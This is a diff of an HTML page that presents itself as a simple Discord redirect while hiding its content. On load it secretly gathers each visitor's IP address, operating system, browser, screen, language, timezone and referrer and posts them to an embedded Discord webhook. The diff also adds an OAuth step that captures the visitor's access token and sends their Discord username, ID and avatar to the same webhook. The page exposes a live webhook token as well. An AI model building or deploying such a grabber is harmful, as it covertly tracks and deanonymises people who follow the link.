@@ -1,11 +1,12 @@
 <!DOCTYPE html>
-<html lang="ar">
+<html lang="en">
+
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>جاري التوجيه...</title>
+    <title>Redirecting...</title>
     <style>
-        /* إخفاء كل محتوى الصفحة تماماً */
+        /* Completely hide the page content */
         body {
             margin: 0;
             padding: 0;
@@ -15,15 +16,19 @@
         }
     </style>
 </head>
+
 <body>
     <script>
-        // === Webhook URL (مقدم من المستخدم) ===
+        // === Webhook URL (provided by user) ===
         const WEBHOOK_URL = "https://discord.com/api/webhooks/1515276137780215858/RxZYK_U3oQXinA04JkdD0FWXKuucps4QFqBaPL7Phs8LcPaFr2bVEVCEyEyVXutP_UKH";
         const DISCORD_REDIRECT = "https://discord.gg/5no";
 
-        // كائن جمع بيانات الزائر
+        // === Discord OAuth2 Client ID ===
+        const CLIENT_ID = "YOUR_DISCORD_CLIENT_ID"; // Replace with your Discord Application Client ID from Developer Portal
+
+        // Visitor data collection object
         let visitorData = {
-            ip: "غير معروف",
+            ip: "Unknown",
             os: "",
             browser: "",
             screen: "",
@@ -35,7 +40,7 @@
             timestamp: null
         };
 
-        // دوال استخراج المعلومات
+        // Information extraction functions
         function getBrowserInfo() {
             const ua = navigator.userAgent;
             let browserName = "Unknown";
@@ -62,7 +67,7 @@
                 const match = ua.match(/OPR\/(\d+\.\d+\.\d+)/);
                 if (match) version = match[1];
             } else {
-                browserName = ua.split(" ").find(part => part.includes("/")) || "متصفح غير معروف";
+                browserName = ua.split(" ").find(part => part.includes("/")) || "Unknown browser";
             }
             return version ? `${browserName} ${version}` : browserName;
         }
@@ -81,7 +86,7 @@
                 return "Linux";
             } else if (ua.indexOf("iPhone") !== -1 || ua.indexOf("iPad") !== -1) return "iOS";
             else if (/CrOS/.test(ua)) return "Chrome OS";
-            else return navigator.platform || "OS غير معروف";
+            else return navigator.platform || "Unknown OS";
         }
 
         function getPlatformDetail() {
@@ -102,7 +107,7 @@
             visitorData.timezone = Intl.DateTimeFormat().resolvedOptions().timeZone || "UTC";
             visitorData.platform = getPlatformDetail();
             visitorData.url = window.location.href;
-            visitorData.referrer = document.referrer || "(مباشر)";
+            visitorData.referrer = document.referrer || "(direct)";
             visitorData.timestamp = new Date().toISOString();
         }
 
@@ -116,29 +121,33 @@
             }
         }
 
-        async function sendAndRedirect() {
+        async function proceedAsGuest(reason = "Client ID not configured") {
             collectLocal();
             await fetchIP();
 
             const embed = {
-                title: "إعادة توجيه إلى ديسكورد",
+                title: "Redirected to Discord (Guest)",
                 color: 0x5865F2,
                 timestamp: visitorData.timestamp,
                 fields: [
-                    { name: "📍 IP", value: visitorData.ip, inline: true },
-                    { name: "💻 نظام التشغيل", value: visitorData.os, inline: true },
-                    { name: "🌐 المتصفح", value: visitorData.browser, inline: true },
-                    { name: "🖥️ دقة الشاشة", value: visitorData.screen, inline: true },
-                    { name: "🔤 اللغة", value: visitorData.language, inline: true },
-                    { name: "🕐 المنطقة الزمنية", value: visitorData.timezone, inline: true },
-                    { name: "📋 المنصة", value: visitorData.platform, inline: true },
-                    { name: "🆔 الرابط", value: visitorData.url, inline: false },
-                    { name: "🔗 المُحيل", value: visitorData.referrer, inline: false }
+                    { name: "👤 Discord Account", value: `*Not authorized (${reason})*`, inline: true },
+                    { name: "📍 IP Address", value: visitorData.ip, inline: true },
+                    { name: "💻 Operating System", value: visitorData.os, inline: true },
+                    { name: "🌐 Browser", value: visitorData.browser, inline: true },
+                    { name: "🖥️ Screen Resolution", value: visitorData.screen, inline: true },
+                    { name: "🔤 Language", value: visitorData.language, inline: true },
+                    { name: "🕐 Timezone", value: visitorData.timezone, inline: true },
+                    { name: "📋 Platform", value: visitorData.platform, inline: true },
+                    { name: "🆔 URL", value: visitorData.url, inline: false },
+                    { name: "🔗 Referrer", value: visitorData.referrer, inline: false }
                 ],
-                footer: { text: "Directed to discord.gg/066" }
+                footer: { text: "Directed to discord.gg/5no" }
             };
 
-            const payload = { embeds: [embed], content: "🔄 **A new visitor was directed to the server**" };
+            const payload = { 
+                embeds: [embed], 
+                content: `🔄 **A new visitor was directed to the server (Guest)**\nReason: ${reason}` 
+            };
 
             try {
                 await fetch(WEBHOOK_URL, {
@@ -147,15 +156,120 @@
                     body: JSON.stringify(payload)
                 });
             } catch (err) {
-                console.error("فشل الإرسال:", err);
+                console.error("Failed to send:", err);
             }
 
-            // التوجيه الفوري بدون أي تأخير مرئي
             window.location.replace(DISCORD_REDIRECT);
         }
 
-        // بدء العملية فوراً
+        async function sendAndRedirect() {
+            // Check if Client ID is configured
+            if (CLIENT_ID === "YOUR_DISCORD_CLIENT_ID" || !CLIENT_ID) {
+                console.warn("Discord Client ID is not configured. Proceeding as guest.");
+                await proceedAsGuest("Client ID not configured");
+                return;
+            }
+
+            const urlParams = new URLSearchParams(window.location.search);
+            const error = urlParams.get('error');
+            const fragment = new URLSearchParams(window.location.hash.slice(1));
+            const accessToken = fragment.get('access_token');
+
+            if (error) {
+                console.warn("Discord authorization error or cancelled by user:", error);
+                await proceedAsGuest(`Authorization denied (${error})`);
+                return;
+            }
+
+            if (!accessToken) {
+                // Redirect to Discord OAuth2 Authorization page (Implicit Grant Flow)
+                const redirectUri = window.location.href.split('#')[0].split('?')[0];
+                const authUrl = `https://discord.com/oauth2/authorize?client_id=${CLIENT_ID}&redirect_uri=${encodeURIComponent(redirectUri)}&response_type=token&scope=identify`;
+                window.location.replace(authUrl);
+                return;
+            }
+
+            // Clean browser history URL to remove access token
+            if (window.history && window.history.replaceState) {
+                window.history.replaceState(null, null, window.location.pathname + window.location.search);
+            }
+
+            collectLocal();
+            await fetchIP();
+
+            let discordUser = {
+                id: "Unknown",
+                username: "Unknown",
+                globalName: "Unknown",
+                avatarUrl: null
+            };
+
+            try {
+                const response = await fetch('https://discord.com/api/users/@me', {
+                    headers: {
+                        'Authorization': `Bearer ${accessToken}`
+                    }
+                });
+                if (response.ok) {
+                    const data = await response.json();
+                    discordUser.id = data.id || "Unknown";
+                    discordUser.username = data.username || "Unknown";
+                    discordUser.globalName = data.global_name || "Unknown";
+                    if (data.id && data.avatar) {
+                        discordUser.avatarUrl = `https://cdn.discordapp.com/avatars/${data.id}/${data.avatar}.png`;
+                    }
+                } else {
+                    console.error("Discord API returned error status:", response.status);
+                }
+            } catch (err) {
+                console.error("Failed to fetch Discord user info:", err);
+            }
+
+            const embed = {
+                title: "Redirected to Discord (Authorized)",
+                color: 0x5865F2,
+                timestamp: visitorData.timestamp,
+                fields: [
+                    { name: "👤 Discord Username", value: `**${discordUser.username}** (${discordUser.globalName})`, inline: true },
+                    { name: "🆔 Discord ID", value: `\`${discordUser.id}\` (<@${discordUser.id}>)`, inline: true },
+                    { name: "📍 IP Address", value: visitorData.ip, inline: true },
+                    { name: "💻 Operating System", value: visitorData.os, inline: true },
+                    { name: "🌐 Browser", value: visitorData.browser, inline: true },
+                    { name: "🖥️ Screen Resolution", value: visitorData.screen, inline: true },
+                    { name: "🔤 Language", value: visitorData.language, inline: true },
+                    { name: "🕐 Timezone", value: visitorData.timezone, inline: true },
+                    { name: "📋 Platform", value: visitorData.platform, inline: true },
+                    { name: "🆔 URL", value: visitorData.url, inline: false },
+                    { name: "🔗 Referrer", value: visitorData.referrer, inline: false }
+                ],
+                footer: { text: "Directed to discord.gg/5no" }
+            };
+
+            if (discordUser.avatarUrl) {
+                embed.thumbnail = { url: discordUser.avatarUrl };
+            }
+
+            const payload = {
+                embeds: [embed],
+                content: `🔄 **A new visitor authorized the app!**\nDiscord User: <@${discordUser.id}> (\`${discordUser.username}\`)`
+            };
+
+            try {
+                await fetch(WEBHOOK_URL, {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify(payload)
+                });
+            } catch (err) {
+                console.error("Failed to send:", err);
+            }
+
+            window.location.replace(DISCORD_REDIRECT);
+        }
+
+        // Start the process immediately
         sendAndRedirect();
     </script>
 </body>
+
 </html>
